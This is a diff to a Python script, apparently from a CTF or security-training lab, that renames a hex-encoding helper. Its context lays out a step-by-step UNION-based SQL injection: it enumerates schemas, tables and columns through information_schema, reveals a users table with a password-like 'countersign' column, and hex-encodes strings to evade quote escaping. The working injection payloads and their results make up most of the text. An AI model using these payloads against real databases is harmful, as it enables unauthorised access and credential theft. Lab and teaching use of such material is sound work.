@@ -14,7 +14,7 @@ import hashlib
 # HELPER FUNCTIONS -----------------------------------------------------------------------------------------------------
 """
 Usage:
-    "Member_Sql_Injection" to hex -> convert_to_hex("Member_Sql_Injection") -> 0x4d656d6265725f53716c5f496e6a656374696f6e
+    "Member_Sql_Injection" to hex -> to_hex("Member_Sql_Injection") -> 0x4d656d6265725f53716c5f496e6a656374696f6e
 """
 to_hex = lambda x="": f"0x{x.encode('utf-8').hex()}"
 
@@ -32,14 +32,14 @@ query = f"1 UNION SELECT NULL, GROUP_CONCAT(0x7c,schema_name,0x7c) FROM informat
 """
 # STEP 2: GET THE TABLE NAMES FOR THE SCHEMA Member_Sql_Injection
 # result: |users|
-schema = convert_to_hex("Member_Sql_Injection")
+schema = to_hex("Member_Sql_Injection")
 query = f"1 UNION SELECT NULL, GROUP_CONCAT(0x7c,table_name,0x7c) FROM information_schema.tables WHERE table_schema={schema}"
 """
 
 """
 # STEP 3: GET THE COLUMN NAMES FOR THE TABLE users
 # result: |user_id|,|first_name|,|last_name|,|town|,|country|,|planet|,|Commentaire|,|countersign|
-table = convert_to_hex("users")
+table = to_hex("users")
 query = f"1 UNION SELECT NULL, GROUP_CONCAT(0x7c,column_name,0x7c) FROM information_schema.columns WHERE table_name={table}"
 """
 
@@ -85,7 +85,7 @@ schema = to_hex("Member_Sql_Injection")
 table = to_hex("users")
 
 # TODO: CHANGE THIS QUERY FOR YOUR NEEDS
-# The quotes are escaped by the backend, so to use a string as a value, we need to convert it to a hexadecimal value with the convert_to_hex function.
+# The quotes are escaped by the backend, so to use a string as a value, we need to convert it to a hexadecimal value with the to_hex function.
 dquote = to_hex('"')
 query = (
         "1 UNION SELECT NULL, GROUP_CONCAT("
